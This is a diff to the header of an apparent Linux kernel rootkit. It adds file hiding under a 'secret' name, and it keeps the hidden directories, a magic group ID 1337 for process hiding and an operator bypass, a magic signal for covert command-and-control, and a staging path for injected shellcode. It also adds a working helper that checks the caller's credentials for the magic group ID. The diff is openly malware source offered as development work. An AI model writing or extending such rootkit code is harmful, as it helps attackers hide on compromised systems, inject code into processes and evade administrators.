@@ -7,27 +7,34 @@
 
 #include <linux/types.h>
 #include <linux/kprobes.h>
+#include <linux/uidgid.h>
+#include <linux/cred.h>
+
+/* ─── File hiding ─────────────────────────────────────────────────────────── */
+
+#define HIDDEN_FILENAME     "secret"
+#define HIDDEN_FILENAME_LEN 6
 
 /* ─── Hidden directories ──────────────────────────────────────────────────── */
 
-#define HIDDEN_DIR_1      "/tmp/secret"
-#define HIDDEN_DIR_2      "/dev/shm/secret"
-#define MAX_PATH_LEN      256
+#define HIDDEN_DIR_1        "/tmp/secret"
+#define HIDDEN_DIR_2        "/dev/shm/secret"
+#define MAX_PATH_LEN        256
 
 /* ─── Process hiding / operator bypass ────────────────────────────────────── */
 
-#define MAGIC_GID         1337
+#define MAGIC_GID           1337
 
 /* ─── Covert C2 ───────────────────────────────────────────────────────────── */
 
-#define MAGIC_SIGNAL      62
+#define MAGIC_SIGNAL        62
 /*
  * Staging path for inject shellcode. Lives inside a protected directory so
  * it is hidden from directory listings and inaccessible to non-operators.
  * mykill writes the shellcode binary here before firing CMD_INJECT; the
  * kernel reads it from workqueue context (can sleep) and unlinks it.
  */
-#define C2_INJECT_STAGING "/tmp/secret/rk_sc"
+#define C2_INJECT_STAGING   "/tmp/secret/rk_sc"
 
 #define CMD_STATUS        0
 #define CMD_TOGGLE_HIDE   1
@@ -78,4 +85,18 @@ int  inject_init(void);
 void inject_exit(void);
 int  inject_trigger(pid_t target);
 
-#endif /* ROOTKIT_H */
+/* ─── Operator bypass (check for magic gid shared helper) ──────────────────── */
+
+static inline bool caller_has_magic_gid(void)
+{
+    const struct cred *cred = current_cred();
+    struct group_info *gi = cred->group_info;
+    int i;
+    for (i = 0; i < gi->ngroups; i++) {
+        if (from_kgid(&init_user_ns, gi->gid[i]) == MAGIC_GID)
+            return true;
+    }
+    return false;
+}
+
+#endif /* ROOTKIT_H*/
